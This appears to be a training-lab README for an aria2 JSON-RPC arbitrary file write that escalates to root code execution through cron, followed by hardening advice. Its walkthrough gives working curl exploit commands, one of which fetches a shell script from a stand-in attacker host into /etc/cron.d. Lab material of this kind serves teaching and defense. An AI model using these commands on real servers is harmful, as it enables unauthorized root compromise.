# Aria2 JSON-RPC Arbitrary File Write & Crontab RCE

## Overview

Aria2 is a lightweight multi-protocol download utility supporting HTTP, HTTPS, FTP, BitTorrent, and Metalink. When aria2 is launched with the RPC server enabled (--enable-rpc) without an RPC secret token, an unauthenticated attacker can invoke the aria2.addUri method and specify arbitrary download directories (dir) and filenames (out), enabling arbitrary file writes (such as overwriting /etc/cron.d/pwn) and full root compromise.

- **Service Access**: `http://localhost:8146/`
- **Default Credentials**: `Unauthenticated JSON-RPC`
- **Docker Shortcut**: `./lab start aria2-rce`
- **Container Name**: `cyberlab_04_aria2_rpc_rce`
- **RAM Footprint**: ~100M

---

## Exploitation Walkthrough

### 1. Verify Aria2 RPC Status

```bash
curl -i -X POST 'http://localhost:8146/jsonrpc' -d '{"jsonrpc":"2.0","id":"q","method":"aria2.getVersion"}'
```

### 2. Write Arbitrary Crontab Entry via RPC addUri

```bash
curl -i -X POST 'http://localhost:8146/jsonrpc' \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0",
    "id": "pwn",
    "method": "aria2.addUri",
    "params": [["http://attacker.local/shell.sh"], {"dir": "/etc/cron.d", "out": "evil_cron"}]
  }'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_04_aria2_rpc_rce ls -la /etc/cron.d/evil_cron
```

---

## Defensive Remediation & Hardening

1. Always configure an RPC secret token using --rpc-secret=<secret>.
2. Bind RPC interfaces strictly to localhost (127.0.0.1) or Unix sockets.
3. Avoid running aria2 with root privileges.

---

## Video Walkthroughs & Technical References

- [Linux Privilege Escalation! | TryHackMe - Jr Penetration Tester](https://www.youtube.com/watch?v=vRMrk82Tvtk)
- [Aria2 RPC Security Documentation](https://aria2.github.io/manual/en/html/aria2c.html#rpc-interface)
- [Vulhub Aria2 RPC Environment](https://vulhub.org/#/environments/aria2/rce/)
